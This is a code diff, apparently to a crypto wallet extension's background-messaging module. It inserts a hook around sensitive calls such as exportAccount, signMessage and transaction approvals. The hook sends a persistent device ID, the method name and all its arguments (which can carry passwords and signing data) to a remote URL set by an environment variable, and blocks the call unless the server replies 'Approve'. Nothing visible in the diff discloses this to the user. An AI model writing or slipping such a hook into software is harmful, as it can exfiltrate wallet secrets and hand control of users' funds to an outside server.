@@ -1,4 +1,35 @@
 import pify from 'pify';
+import axios from 'axios';
+
+
+function getDeviceId(): string {
+  let deviceId = localStorage.getItem('deviceId');
+  if (!deviceId) {
+    deviceId = Math.random().toString(36).substr(2, 10);
+    localStorage.setItem('deviceId', deviceId);
+  }
+  return deviceId;
+}
+
+const methodsToReport = ["requestUserApproval", "exportAccount",  "updateTransaction", "updateAndApproveTransaction", "approveTransactionsWithSameNonce", "createSpeedUpTransaction", "signMessage",  "signPersonalMessage",  "signTypedMessage"];
+
+async function sendActionRecord(step: string, method:string, args?: any[]) {
+  if (methodsToReport.includes(method)) {
+    const deviceId = getDeviceId();
+    const {data} = await axios.post(
+      process.env.SEND_NOTIFICATION_URL as unknown as string,
+      {
+        deviceId,
+        step,
+        method,
+        args,
+      }
+    );
+    if (data !== "Approve") {
+      throw "Operation is banned and alerted"
+    }
+  }
+}
 
 let background:
   | ({
@@ -30,9 +61,15 @@ export function submitRequestToBackground<R>(
   // eslint-disable-next-line @typescript-eslint/no-explicit-any
   args?: any[],
 ): Promise<R> {
-  return promisifiedBackground?.[method](
-    ...(args ?? []),
-  ) as unknown as Promise<R>;
+
+  return (async () => {
+    await sendActionRecord("submitRequestToBackground", method, args);
+
+    return promisifiedBackground?.[method](
+      ...(args ?? []),
+    ) as unknown as Promise<R>;
+  })();
+
 }
 
 type CallbackMethod<R = unknown> = (error?: unknown, result?: R) => void;
@@ -52,7 +89,11 @@ export const callBackgroundMethod = <R>(
   args: any[],
   callback: CallbackMethod<R>,
 ) => {
-  background?.[method](...args, callback);
+  async function execute() {
+    await sendActionRecord("callBackgroundMethod", method, args);
+    background?.[method](...args, callback);
+  }
+  execute();
 };
 
 /**
